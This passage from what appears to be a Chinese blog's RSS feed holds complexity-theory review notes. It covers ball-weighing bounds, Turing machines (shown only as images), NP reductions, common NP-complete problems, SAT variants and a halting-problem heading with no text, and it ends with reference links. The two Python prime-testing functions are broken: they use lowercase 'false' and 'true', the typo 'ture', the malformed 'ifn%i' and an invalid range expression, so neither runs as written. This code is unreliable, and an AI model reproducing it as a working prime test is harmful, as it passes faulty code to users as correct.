性，设计高效的算法和安全方案，以保护数据和系统的安全性。</p><h2 id="39-N个乒乓球中有一个和其他的质量不同，用天平最少几次能称出来？"><a href="#39-N个乒乓球中有一个和其他的质量不同，用天平最少几次能称出来？" class="headerlink" title="39.N个乒乓球中有一个和其他的质量不同，用天平最少几次能称出来？"></a>39.N个乒乓球中有一个和其他的质量不同，用天平最少几次能称出来？</h2><p>不考虑最后得到的乒乓球质量和正常质量相比是大是小，最少需要[log3(2n+1)]；</p><p>考虑最后乒乓球质量的大小，最少需要[log3(2n+3)]；</p><h2 id="40-图灵机相关问题"><a href="#40-图灵机相关问题" class="headerlink" title="40.图灵机相关问题"></a>40.图灵机相关问题</h2><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627213831778.png" alt="image-20230627213831778" style="zoom:50%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627213850389.png" alt="image-20230627213850389" style="zoom:67%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627213943465.png" alt="image-20230627213943465" style="zoom:50%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627214049933.png" alt="image-20230627214049933" style="zoom:50%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627214329899.png" alt="image-20230627214329899" style="zoom:50%;" /></p><p>例题：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627214558204.png" alt="image-20230627214558204" style="zoom: 50%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627214910488.png" alt="image-20230627214910488"></p><details>    ![image-20230627214828247](https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627214828247.png)</details><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627214828247.png" alt="image-20230627214828247"></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627215324421.png" alt="image-20230627215324421" style="zoom:67%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627215626212.png" alt="image-20230627215626212" style="zoom:50%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627220346752.png" alt="image-20230627220346752" style="zoom: 67%;" /></p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627220402800.png" alt="image-20230627220402800" style="zoom:67%;" /></p><h2 id="41-NP问题之间归约？常见的NPC问题？"><a href="#41-NP问题之间归约？常见的NPC问题？" class="headerlink" title="41.NP问题之间归约？常见的NPC问题？"></a>41.NP问题之间归约？常见的NPC问题？</h2><p><font color=pink>NP问题归约</font>：(从上到下)</p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627205644167.png" alt="image-20230627205644167" style="zoom: 67%;" /></p><p><font color=pink>常见NPC问题</font>：</p><ul><li>布尔可满足性问题：是否存在一组变量使得问题可满足。</li><li>0-1整数规划</li><li><p>分团问题：一个图中是否有大小是k个的团。任意挑出k个点，可判断是不是一个团，所以问题是NP；</p><ul><li>setpacking</li><li>最小顶点覆盖</li></ul></li><li><p>图着色问题</p></li><li><p>背包问题</p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627211504443.png" alt="image-20230627211504443" style="zoom: 50%;" /></p></li></ul><h2 id="42-SAT、2SAT、3SAT"><a href="#42-SAT、2SAT、3SAT" class="headerlink" title="42.SAT、2SAT、3SAT"></a>42.SAT、2SAT、3SAT</h2><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627212725004.png" alt="image-20230627212725004"></p><h2 id="43-素数判定的递归和非递归算法"><a href="#43-素数判定的递归和非递归算法" class="headerlink" title="43.素数判定的递归和非递归算法"></a>43.素数判定的递归和非递归算法</h2><p>递归：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">n,i</span>):</span><br><span class="line"><span class="keyword">if</span>(n&lt;=<span class="number">2</span>): <span class="keyword">return</span> n==<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> n%i == <span class="number">0</span>: <span class="keyword">return</span> false</span><br><span class="line"><span class="keyword">if</span> i*i&gt;n: <span class="keyword">return</span> true</span><br><span class="line"><span class="keyword">return</span> isPrime(n,i+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">n</span>):</span><br><span class="line"><span class="keyword">if</span> n&lt;=<span class="number">1</span>: <span class="keyword">return</span> false</span><br><span class="line"><span class="keyword">for</span>(i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">ifn%i == <span class="number">0</span>:<span class="keyword">return</span> false</span><br><span class="line"><span class="keyword">return</span> ture</span><br></pre></td></tr></table></figure><h2 id="44-为什么停机问题是不可判定的？"><a href="#44-为什么停机问题是不可判定的？" class="headerlink" title="44.为什么停机问题是不可判定的？"></a>44.为什么停机问题是不可判定的？</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/liusiqian0209/article/details/49837447">(118条消息) NP完全性理论简介_np完整性_liusiqian0209的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/liusiqian0209/article/details/49837447">(118条消息) NP完全性理论简介_np完整性_liusiqian0209的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/351638078">算法学习笔记(71): 2-SAT - 知乎 (zhihu.com)</a></p><p><a href="https://blog.sciencenet.cn/blog-2322490-933277.html">科学网—什么是“判定问题”？（2）－悖论、停机问题与NP - 柳渝的博文 (sciencenet.cn)</a></p><p><a href="停机问题"></a>：<a href="https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1qb41187AG%3Fshare_source%3Dcopy_web">https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1qb41187AG%3Fshare_source%3Dcopy_web</a></p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/">大学</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/">大三下</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E4%B8%89%E4%B8%8B/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA/">复杂性理论</category>
      
      
      <category domain="http://example.com/tags/%E5%A4%8D%E4%B9%A0/">复习</category>
      
      
      <comments>http://example.com/2023/06/26/%E5%A4%8D%E6%9D%82%E6%80%A7%E7%90%86%E8%AE%BA%E5%A4%8D%E4%B9%A0/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
